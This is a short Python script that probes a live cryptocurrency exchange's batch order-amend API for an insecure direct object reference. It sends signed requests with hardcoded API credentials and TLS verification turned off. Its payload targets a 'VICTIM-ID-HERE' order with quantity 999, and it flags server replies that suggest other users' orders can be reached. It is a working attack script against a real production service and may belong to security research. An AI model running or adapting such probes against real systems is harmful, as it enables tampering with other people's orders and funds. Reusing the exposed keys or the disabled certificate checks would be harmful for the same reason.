#!/usr/bin/env python3
import urllib.request
import ssl
import time
import hmac
import hashlib
import json

print("BATCH ORDER RACE TEST", flush=True)
print("="*50, flush=True)

API_KEY = "22JSr5zWpW0eReC6rE"
API_SECRET = "QZhQLj0tXsbSeTHYHnvoB99GKILfFdMkzWYN"
BASE_URL = "https://api.bybit.com"

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

# Step 1: Get server time
print("\n[1] Getting server time offset...", flush=True)
req = urllib.request.Request(BASE_URL + "/v5/market/time")
response = urllib.request.urlopen(req, context=ctx, timeout=5)
server_data = json.loads(response.read().decode())
server_time_ms = int(server_data['result']['timeSecond']) * 1000
local_time_ms = int(time.time() * 1000)
offset = server_time_ms - local_time_ms
print(f"Offset: {offset}ms", flush=True)

# Step 2: Test batch endpoint
print("\n[2] Testing /v5/order/amend-batch...", flush=True)

payload_dict = {
    "category": "linear",
    "request": [
        {"symbol": "BTCUSDT", "orderId": "fake-order-1", "qty": "0.001"},
        {"symbol": "BTCUSDT", "orderId": "fake-order-2", "qty": "0.001"},
        {"symbol": "BTCUSDT", "orderId": "VICTIM-ID-HERE", "qty": "999"}
    ]
}

payload = json.dumps(payload_dict)
timestamp = str(int(time.time() * 1000) + offset)
recv_window = "60000"

sign_payload = f"{timestamp}{API_KEY}{recv_window}{payload}"
signature = hmac.new(bytes(API_SECRET, "utf-8"), bytes(sign_payload, "utf-8"), hashlib.sha256).hexdigest()

req = urllib.request.Request(BASE_URL + "/v5/order/amend-batch", data=payload.encode(), method='POST')
req.add_header("X-BAPI-API-KEY", API_KEY)
req.add_header("X-BAPI-SIGN", signature)
req.add_header("X-BAPI-SIGN-TYPE", "2")
req.add_header("X-BAPI-TIMESTAMP", timestamp)
req.add_header("X-BAPI-RECV-WINDOW", recv_window)
req.add_header("Content-Type", "application/json")

print("Sending request...", flush=True)

try:
    response = urllib.request.urlopen(req, context=ctx, timeout=5)
    raw_data = response.read().decode()
    
    print(f"\n✓ RAW RESPONSE:", flush=True)
    print(raw_data, flush=True)
    
    data = json.loads(raw_data)
    print(f"\nRetCode: {data.get('retCode')}", flush=True)
    print(f"RetMsg: {data.get('retMsg')}", flush=True)
    
    if 'result' in data and 'list' in data['result']:
        print(f"\nProcessing result list:", flush=True)
        for item in data['result']['list']:
            oid = item.get('orderId')
            code = item.get('code')
            msg = item.get('msg')
            print(f"  Order: {oid}", flush=True)
            print(f"    Code: {code}, Msg: {msg}", flush=True)
            
            # CRITICAL ANALYSIS
            if code == 110001 or 'not found' in str(msg).lower():
                print(f"    🚨 IDOR POTENTIAL - Server searched for order!", flush=True)
            elif 'permission' in str(msg).lower() or 'access denied' in str(msg).lower():
                print(f"    ✓ Secure - Permission check first", flush=True)
                
except urllib.error.HTTPError as e:
    print(f"\nHTTP Error: {e.code}", flush=True)
    print(e.read().decode(), flush=True)
except Exception as e:
    print(f"\nError: {e}", flush=True)

print("\n" + "="*50, flush=True)
print("TEST COMPLETE", flush=True)
